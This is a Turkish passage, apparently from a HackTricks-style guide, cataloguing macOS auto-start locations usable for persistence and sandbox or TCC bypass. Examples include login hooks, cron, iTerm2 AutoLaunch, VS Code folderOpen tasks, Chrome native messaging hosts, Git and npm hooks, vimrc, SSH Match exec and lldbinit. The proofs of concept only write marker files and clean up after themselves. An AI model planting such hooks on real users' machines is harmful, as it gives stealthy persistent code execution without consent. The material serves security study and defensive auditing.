QuickLook eklentileri, **bir dosyanın önizlemesini başlattığınızda** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve **bu dosya türünü destekleyen bir eklenti** yüklüyse çalıştırılabilir.<sup>[[8]](#references)</sup>

Kendi QuickLook eklentinizi derleyip önceki konumlardan birine yerleştirerek yüklenmesini sağlayabilir, ardından desteklenen bir dosyaya gidip boşluk tuşuna basarak çalıştırabilirsiniz.

Bu yollar, eski `.qlgenerator` paketlerini ifade eder; [Apple'ın Quick Look mimarisi kılavuzu](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) arama sırasını ve eşleşen dosya türlerini açıklar. Güncel Quick Look **app extension'ları** bir uygulamayla paketlenir ve farklı kayıt ve çalıştırma kurallarına tabidir. Bir generator'ın bulunması, onun tür seçimini kazanacağını veya kodunun Finder'ın kendisinde çalışacağını göstermez. Eski generator yolu, belgeler ve dizinlerin varlığı üzerinden incelendi; araştırma Mac'inde hiçbir generator yüklenmedi veya çalıştırılmadı.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Bu bende çalışmadı; ne kullanıcı LoginHook'u ne de root LogoutHook'u.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir komutu çalıştırabilmeniz gerekir
  - `~/Library/Preferences/com.apple.loginwindow.plist` içinde bulunur

Bunlar kullanımdan kaldırılmıştır ancak kullanıcı oturum açtığında komut çalıştırmak için kullanılabilir.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` konumunda saklanır.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Silmek için:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Root kullanıcısına ait olan şu konumda saklanır: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Koşullu Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için yararlı başlangıç konumlarını bulabilirsiniz. Bu konumlar, bir şeyi **dosyaya yazarak** ve belirli **programların yüklü olması**, **“pek yaygın olmayan” kullanıcı** eylemleri veya ortamlar gibi pek yaygın olmayan koşulların gerçekleşmesini **bekleyerek** çalıştırmanıza olanak tanır.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak `crontab` binary’sini çalıştırabiliyor olmanız gerekir
  - Ya da root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`**
  - Doğrudan yazma erişimi için root gerekir. `crontab <file>` komutunu çalıştırabiliyorsanız root gerekmez
  - **Tetikleyici**: Yüklü crontab’daki zamanlama. `at` ve `periodic`, aşağıda açıklanan ayrı mekanizmalardır.

#### Açıklama ve Exploitation

**Mevcut kullanıcının** cron işlerini şu komutla listeleyin:

```bash
crontab -l
```

Sistem cron daemon'ının launchd plist dosyasında `/usr/lib/cron/tabs` için bir `QueueDirectories` girdisi bulunur; yüklenmiş kullanıcı crontab'ları burada tutulur. Diğer kullanıcıların crontab'larını incelemek için root gerekir:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Geçici bir hesapta, yalnızca işaretleyici içeren bir kullanıcı cron girdisi `crontab` ile eklenebilir ve gözlemlendikten sonra kaldırılabilir. `crontab <file>` **hesabın mevcut crontab'ının tamamını değiştirir**, bu nedenle hesap geçici değilse crontab'ı kaydedip geri yükleyin:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2'nin daha önce verilmiş TCC izinleri vardı

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Tetikleyici**: Bu klasörde uygun bir Python API script'i varken iTerm2'yi başlatmak
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Tetikleyici**: iTerm2'yi başlatmak; AppleScript startup hook'u ayrı olarak belgelenmiştir
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Tetikleyici**: Komutu veya başlangıç metni payload'ı çalıştıran profile sahip bir oturum oluşturmak

#### Açıklama ve Exploitation

[Mevcut iTerm2 Python API kılavuzu](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts), `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` konumundaki otomatik çalıştırılan **Python** script'lerini belgeler. Bu klasördeki rastgele bir çalıştırılabilir `.sh` dosyasının çalıştırıldığını doğrulamaz. Geçici bir hesapta bunu `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` olarak kaydedin:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[Güncel iTerm2 AppleScript kılavuzu](https://iterm2.com/documentation-scripting.html), `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` konumunu ayrıca belgeliyor; modern klasör mevcut olmadığında eski `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` konumuna geri dönüyor. Yalnızca bir işaretleyici içeren AppleScript şöyledir:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Bu script örnekleri etkin masaüstü oturumunda çalıştırılmadı; iTerm2 belgeleriyle karşılaştırılarak kontrol edildi. Geçici bir hesapta test ettikten sonra test scriptini ve sırasıyla `/tmp/ht-iterm-autolaunch-marker` veya `/tmp/iterm2-autolaunchscpt` dosyasını kaldırın.

**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumundaki iTerm2 tercihleri bir profil komutu veya başlangıç metni belirtebilir. İkincisi bir oturuma yazılır; çalıştırılması, onu yorumlayan bir shell'e bağlıdır. [iTerm2'nin profil belgeleri](https://iterm2.com/documentation-preferences-profiles-general.html), bu profile sahip yeni bir oturum oluşturulduğunda çalıştırılan komutu açıklar.

Bu ayar iTerm2 ayarlarında yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komut tercihlerde şu şekilde görünür:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

For güvenli bir değerlendirme için iTerm2 ayarlarında seçilen profili inceleyin veya tercih dosyasının bir kopyasını okuyun. Canlı bir profilde `Initial Text` değerini değiştirmek kullanıcının oturumlarını etkilerdi; bu nedenle araştırma Mac’inde hiçbir tercih değiştirilmedi.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Sandbox'i atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak xbar yüklü olmalıdır
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility izinleri ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Popüler [**xbar**](https://github.com/matryer/xbar) programı yüklüyse, xbar başlatıldığında çalıştırılacak bir shell script **`~/Library/Application\ Support/xbar/plugins/`** konumuna yazılabilir:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Sandbox'u atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Hammerspoon'un kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
  - **Tetikleyici**: hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA betik dilinden** yararlanan bir **macOS** otomasyon platformudur. Özellikle, tüm AppleScript kodlarının entegrasyonunu ve shell script'lerinin çalıştırılmasını destekleyerek betik oluşturma özelliklerini önemli ölçüde geliştirir.<sup>[[13]](#references)</sup>

Uygulama tek bir dosya olan `~/.hammerspoon/init.lua` dosyasını arar ve başlatıldığında betik çalıştırılır.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak BetterTouchTool yüklü olmalıdır
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
  - Automation-Shortcuts ve Accessibility izinlerini ister

#### Konum

- Etkin bir BetterTouchTool preset'i tarafından **önceden referans verilmiş** bir betik dosyası veya `~/Library/Application Support/BetterTouchTool/` altındaki bu preset'in yapılandırması. Betiğin tam yolu, preset'in nasıl yapılandırıldığına bağlıdır.

[BetterTouchTool'ın eylem referansı](https://docs.folivora.ai/docs/actions/action-definitions/) shell-script ve background-command eylemlerini açıklar. İlgili preset etkin durumdayken yapılandırılmış klavye, fare, dokunma, widget veya başka bir olay gerçekleşmelidir; [tetikleyici kılavuzu](https://docs.folivora.ai/docs/configuration/new-trigger/) bu eşleştirmeyi gösterir. Uygulama destek dizinindeki rastgele bir dosya tetikleyici değildir. Harici, yazılabilir bir betiği yükleyen önceden yapılandırılmış bir eylem, yazmadan yürütmeye uzanan daha sınırlı bir hedeftir. Kod, gerçek macOS izinlerine tabi olarak BetterTouchTool kullanıcısının hesabıyla çalışır. Araştırma Mac'inde BetterTouchTool `/Applications` altında bulunmadığından, yerel olarak hiçbir preset değiştirilmedi veya çalıştırılmadı.

### Alfred

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Alfred yüklü olmalıdır
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
  - Automation, Accessibility ve hatta Full-Disk Access izinlerini ister

#### Konum

- Yüklü bir Alfred workflow'u tarafından **önceden referans verilmiş** bir betik veya dosya ya da kullanıcının yapılandırdığı `Alfred.alfredpreferences` dizinindeki bu workflow. Preferences dizini senkronize edilebilir ve herkes için geçerli sabit bir yolu yoktur.

[Alfred'ın workflow kılavuzu](https://www.alfredapp.com/help/workflows/) Powerpack gereksinimini ve kullanıcı arayüzü üzerinden yüklemeyi açıklar. Yüklü bir workflow'un hotkey, keyword veya yapılandırılmış başka bir tetikleyicisi çalışmalıdır; [Alfred'ın hotkey örneği](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) bir script eylemini gösterir. [Alfred'ın ortam referansı](https://www.alfredapp.com/help/workflows/script-environment-variables/) seçili preferences yolunu `alfred_preferences` olarak sunar. Kaydedilmemiş bir workflow dosyasını rastgele bir dizine bırakmak, yükleneceğini veya çalıştırılacağını kanıtlamaz. Kod, gerçek macOS izinleriyle birlikte oturum açmış Alfred kullanıcısı olarak çalışır. Araştırma Mac'inde Alfred `/Applications` altında bulunmadığından, bu yol yalnızca belgelere dayanarak değerlendirildi.

### Raycast Script Commands ve extension yenileme

- **Yazma hedefi:** Raycast Settings → Script Commands altında **önceden eklenmiş** bir dizindeki çalıştırılabilir betik. Raycast, rastgele oluşturulan yeni bir dizini taramaz. [Raycast'in Script Commands kılavuzu](https://manual.raycast.com/script-commands) dizin kaydını açıklar.
- **Tetikleyici ve kimlik:** Kullanıcı indekslenmiş komutu çağırır, yapılandırılmış bir hotkey veya fallback komutu çağırır ya da Raycast, yapılandırılmış `@raycast.refreshTime` süresinde bir `inline` betiği yeniler. Betik, yorumlayıcısı aracılığıyla oturum açmış Raycast kullanıcısı olarak çalışır. [Upstream metadata referansı](https://github.com/raycast/script-commands#metadata) otomatik yenilemeyi yalnızca inline komutlarla sınırlar; [Raycast'in extension manifest'i](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) ise yüklenmiş `no-view` veya `menu-bar` extension komutları için ayrıca bir `interval` destekler. Normal bir script command eklemek tek başına zamanlanmış çalıştırma sağlamaz.

Kayıtlı bir betik dizinine sahip, geçici bir hesap için yalnızca bir işaretleyici oluşturan inline betik şöyledir:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Kaydı kayıtlı dizine kaydedin, çalıştırılabilir hâle getirin ve Raycast'in yenilemesini sağlayın. Ardından bu dosyayı ve `/tmp/ht-raycast-refresh-marker` dosyasını silin. Araştırma Mac'inde Raycast, alışılmış `/Applications` adı altında bulunmadığından bu adımlar dokümantasyona dayanıyor ve yerel olarak çalıştırılmadı. Accessibility, Automation ve dosya izinleri macOS izin istemlerine tabidir.

### Visual Studio Code otomatik workspace görevleri

- **Yazılacak hedef:** Kullanıcının açacağı bir workspace içindeki `.vscode/tasks.json`.
- **Tetikleyici:** VS Code'da bu workspace'in açılması; ancak yalnızca klasör güvenilir olarak işaretlenmişse **ve** otomatik görevlere izin verilmişse. Güvenilmeyen bir workspace otomatik görevleri asla çalıştırmaz; varsayılan ayar, ilk otomatik çalıştırmadan önce kullanıcıya sorar. [VS Code görevleri dokümantasyonu](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) ve [Workspace Trust dokümantasyonu](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) bu iki koşulu açıklar.
- **Çalıştırma kimliği:** Yapılandırılmış görev süreci aracılığıyla VS Code kullanıcısının hesabı. Bu, uygulamaya özgü bir çalıştırmadır; oturum açılışında kalıcılık değildir.

**Yeni ve geçici bir workspace** içinde, yalnızca işaretleyici oluşturan bu görevi `.vscode/tasks.json` dosyasına yerleştirin:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Güvenilir workspace'i açtıktan ve otomatik görevlerin çalışmasına izin verdikten sonra `.autostart-task-ran` dosyasını kontrol edin. Temizlemek için görev girdisini ve işaretçi dosyasını kaldırın. **Bu, Microsoft'un belgeleri ve yüklü VS Code 1.139.1 paketi kullanılarak doğrulandı; etkin masaüstü oturumunda çalıştırılmadı.**

### Chrome native messaging host'ları

- **Yazma hedefi:** Geçerli kullanıcı için `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` veya tüm kullanıcılar için `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` (yönetici yazma izni gerekir). Chromium ve Chrome for Testing farklı dizinler kullanır; [Chrome'un güncel yol tablosuna](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location) bakın.
- **Tetikleyici:** `nativeMessaging` iznine sahip yüklü bir Chrome extension, manifest'teki tam host adını kullanarak `chrome.runtime.connectNative()` veya `chrome.runtime.sendNativeMessage()` çağrısı yapar. Ardından Chrome, host executable'ını başlatır. Yalnızca Chrome'u açmak, rastgele yeni bir native host'u çalıştırmaz; çağrı yapan bir extension olmadan manifest oluşturmak hiçbir işe yaramaz. [Chrome'un native messaging kılavuzu](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) bu el sıkışma sürecini açıklar.
- **Çalıştırma kimliği:** Chrome kullanıcısının hesabı. Manifest, mutlak bir executable yolu belirtmeli ve çağrı yapan extension origin'ine açıkça izin vermelidir.

Atılabilir bir browser hesabında, bir test extension ile aşağıdaki dosya çifti yazma-çalıştırma bağlantısını gösterir. Manifest'in dosya adı `name` değeriyle eşleşmeli, `TEST_EXTENSION_ID` ise extension'ın gerçek kimliğiyle değiştirilmelidir:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Bu JSON'ı `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` konumuna kaydedin. Manifest'teki `path` değerinde bulunan yalnızca işaretleyici amaçlı yürütülebilir dosya şunları içerebilir:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Test extension, service worker'ından veya extension sayfasından `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` çağrısını yaptıktan sonra marker, host'un başlatıldığını kanıtlar. Bu minimal host, Chrome'un uzunluk önekli yanıt protokolünü uygulamaz; bu nedenle marker yazıldıktan sonra extension bir mesajlaşma hatası bildirebilir. Temizlemek için test manifest'ini, host'u ve marker'ı kaldırın. macOS 26.5.2'de Chrome uygulaması ve her iki manifest dizini mevcuttu; **etkin Chrome profili değiştirilmedi veya kullanılmadı**.

### Karabiner-Elements tuş olayı komutları

- **Yazma hedefi:** Karabiner-Elements'in kurulu ve çalışır durumda olduğu bir hesaptaki `~/.config/karabiner/karabiner.json`. [Karabiner's file-location guide](https://karabiner-elements.pqrs.org/docs/json/location/) uygulamanın yazma işleminden sonra bu dosyayı izlediğini ve yeniden yüklediğini belirtir. `assets/complex_modifications` içindeki JSON dosyaları yalnızca içe aktarılabilir ön ayarlardır; buraya bir dosya yazmak tek başına bir kuralı etkinleştirmez.
- **Tetikleyici:** Kural etkinleştirildikten sonra yapılandırılan tuş olayı. [`to.shell_command` reference](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) komut yürütmeyi açıklar. Bu, oturum açıldığında veya her dosya yazma işleminde kod yürütülmesi değildir.
- **Yürütme kimliği:** Karabiner'in kullanıcı sürecini çalıştıran oturum açmış kullanıcı. Uygulamanın kendi izinleri ve TCC erişimi uygulamaya ve sürüme bağlıdır.

Geçici bir test hesabında, profilin geri kalanını koruyarak bu kural nesnesini `karabiner.json` içindeki seçili profilin `complex_modifications.rules` dizisine ekleyin. Zararsız bir marker oluşturmak için F18'e basın, ardından bu kuralı ve marker'ı kaldırın. Normalde yazı yazarken kullanılan bir tuşu değiştirmemek için F18'i seçin:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements macOS 26.5.2 test makinesinde `/Applications` içine yüklenmemişti; bu nedenle bu, yerel çalışma zamanı sonucundan ziyade belgelere dayalı bir PoC'dir.

### Yerel bir depodaki Git hook'ları

- **Yazma hedefi:** `<repo>/.git/hooks/post-checkout` gibi çalıştırılabilir bir hook. `core.hooksPath` önceden ayarlanmışsa bunun yerine yapılandırılan dizini kullanın. Normal bir izlenen kaynak dosyası olarak commit edilen hook, clone işlemine otomatik olarak yüklenmez.
- **Tetikleyici:** İlgili Git işlemi. Örneğin `post-checkout`, `git checkout` veya `git switch` sonrasında çalışır; ayrıca clone veya worktree oluşturma sonrasında da çalışabilir. [Git'in hook başvurusu](https://git-scm.com/docs/githooks), olayları ve çalıştırılabilir bit gereksinimini listeler; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) arama dizinini değiştirir.
- **Çalıştırma kimliği:** Git'i çalıştıran hesap. Hook yalnızca deponun etkin hook dizini işlemi yapan kullanıcı tarafından yazılabilir durumdaysa ve kullanıcı daha sonra ilgili Git işlemini gerçekleştirirse çalıştırılabilir.

Yalnızca bir işaretçi oluşturan bu PoC, tamamen geçici bir depo oluşturur, bir hook yükler ve bir branch'e geçiş yapar. macOS 26.5.2'de Apple Git 2.50.1 ile başarıyla çalıştırılmıştır:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Bir projedeki npm lifecycle scripts

- **Yazma hedefi:** Yazılabilir bir projenin `package.json` dosyasındaki `scripts` eşlemesi veya kullanıcının lifecycle script'ini çalıştıracağı yüklü bir bağımlılık paketi. Bu, bir dizini açınca çalıştırılan bir şey değil, geliştirme iş akışına yönelik bir hook'tur.
- **Tetikleyici ve kimlik:** Daha sonra çalıştırılan `npm install` veya `npm ci`, lifecycle script'lerine izin veriliyorsa `preinstall`, `install` ve `postinstall` komutlarını npm'i çalıştıran kullanıcı olarak yürütür. Sıradan bir `npm run <name>` komutu da eşleşen `pre<name>` ve `post<name>` script'lerini çalıştırır. [npm'in lifecycle referansı](https://docs.npmjs.com/cli/v11/using-npm/scripts) olayları listeler; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) install lifecycle script'lerini devre dışı bırakabilir. Sürüm ve ilke ayarları nelerin çalıştırılabileceğini değiştirebilir; bu nedenle hedef npm sürümünü kontrol edin.

Bu yalnızca bir işaretleyici oluşturan PoC, yerel npm ile geçici ve boş bir dizinde çalıştırıldı. Bağımlılık indirmez veya kullanıcının projesinde değişiklik yapmaz:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Bu, Python interpreter başlangıç dosyalarından farklıdır: npm'in ilgili install veya run işlemini gerçekleştirmesi gerekirken, Python `site` kodu sıradan bir interpreter çağrısında yüklenebilir. Genel `Makefile` hedefleri ve build task tanımları da benzer şekilde, kullanıcının veya önceden yapılandırılmış bir aracın ilgili hedefi çağırmasını gerektirir; bunlar ayrı OS otomatik başlatma yolları değildir.

### Vim başlangıç yapılandırması

- **Yazma hedefi:** Vim'i başlatacak kullanıcının `~/.vimrc` dosyası (veya Vim'in başlatma sırasına göre seçilen başka bir başlangıç dosyası). [Vim'in başlangıç referansı](https://vimhelp.org/starting.txt.html) bu dosyayı ve `VIMINIT`/`EXINIT` geçersiz kılmalarını belgeler.
- **Tetikleyici:** Bu yapılandırmayı yükleyen sonraki sıradan bir Vim başlangıcı. Vim'in `-u NONE` seçeneği kullanıcı vimrc dosyasını atlar. Bu, editöre özgü bir yürütmedir; OS oturum açma tetikleyicisi değildir.
- **Yürütme kimliği:** Vim kullanıcısının hesabı.

Aşağıdaki yalıtılmış PoC, macOS'un `/usr/bin/vim` dosyasıyla çalıştırıldı; gerçek Vim tercihlerini veya açık belgeleri yazmaz:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim'in ayrı bir kullanıcı yapılandırma yolu vardır: `$XDG_CONFIG_HOME/nvim/init.lua` veya `init.vim`. Ayrıca [başlangıç belgelerinde](https://neovim.io/doc/user/starting/) açıklandığı gibi `plugin/` runtime dizinlerindeki scriptleri de yükler. Neovim, macOS 26.5.2 test makinesine yüklenmediğinden bu varyant orada çalıştırılmadı.

### SSH client yapılandırma komutları

- **Yazma hedefi:** `~/.ssh/config` veya bu dosyanın zaten dahil ettiği başka bir dosya. Bu bir **client** yapılandırma dosyasıdır; aşağıda açıklanan sunucu tarafındaki `~/.ssh/rc` dosyasından ayrıdır.
- **Tetikleyici:** Eşleşen bir `ssh` çağrısı. `Match exec`, client yapılandırmasını değerlendirirken yerel bir komut çalıştırır; bağlantı kurmadan yapılandırmayı yazdıran `ssh -G` için bile çalışır. `ProxyCommand`, client eşleşen bir bağlantı kurarken çalışır. `LocalCommand` yalnızca başarılı bir bağlantıdan sonra çalışır ve `PermitLocalCommand yes` gerektirir (varsayılan değer `no`'dur). Bunların zamanlamaları ve ön koşulları farklıdır; yalnızca dosyaya yazmak bunları çalıştırmaz. Upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) belgesine bakın.
- **Çalıştırma kimliği:** `ssh` komutunu çalıştıran yerel kullanıcı. Eşleşen bir host, uygulanabilir bir yapılandırma dosyası ve gerekli bağlantı koşulları gerekir. `ssh -F` farklı bir yapılandırma dosyası seçebilir.

Bu yalnızca marker içeren PoC, macOS 26.5.2'de Apple'ın SSH client'ıyla çalıştırıldı. `-G`, ağ bağlantısı kurmadan veya kullanıcının gerçek SSH yapılandırmasını okumadan `Match exec` davranışını sınar:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger başlatma dosyaları

- **Yazma hedefi:** `~/.lldbinit` veya `~/.lldbinit-lldb` gibi daha yüksek öncelikli, uygulamaya özgü dosya. LLDB, hata ayıklayıcı başlatılırken bu dosyalardan birini okur. Geçerli dizindeki `.lldbinit` varsayılan olarak **çalıştırılmaz**; kullanıcının `target.load-cwd-lldbinit` ayarını etkinleştirmesi veya `--local-lldbinit` seçeneğini geçmesi gerekir. Bkz. [LLDB manual](https://lldb.llvm.org/man/lldb.html).
- **Tetikleyici ve kimlik:** Kullanıcı LLDB'yi `--no-lldbinit` olmadan başlatır; komutlar o kullanıcı olarak çalışır. Yalnızca bir projeyi açmak, projenin `.lldbinit` dosyasının çalışacağı anlamına gelmez.

Aşağıdaki yalnızca işaretleyici içeren test, yalıtılmış bir ana dizin ve çalışma diziniyle macOS 26.5.2 üzerindeki LLDB'de çalıştırıldı:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [upstream başlangıç belgeleri](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) macOS'te önce `$HOME/Library/Preferences/gdb/gdbinit`, ardından `~/.gdbinit` dosyasını listeler. Geçerli dizindeki `.gdbinit`, [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html) kısıtlamasına tabidir; `-nx`/`-nh` ise başlatma dosyalarını devre dışı bırakır. Test Mac'inde GDB yüklü olmadığından bu varyant yerel olarak çalıştırılmadı.

### SSHRC

Yazı: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Sandbox'u atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak ssh'nin etkinleştirilmiş ve kullanılıyor olması gerekir
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
  - SSH kullanımı FDA erişimine sahip olmalı

#### Konum

- **`~/.ssh/rc`**
  - **Tetikleyici**: ssh ile giriş
- **`/etc/ssh/sshrc`**
  - Root gerekir
  - **Tetikleyici**: ssh ile giriş

> [!CAUTION]
> ssh'yi etkinleştirmek için Full Disk Access gerekir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` ayarı olmadığı sürece, kullanıcı **SSH üzerinden giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** betikleri çalıştırılır.<sup>[[14]](#references)</sup>

### **Login Items**

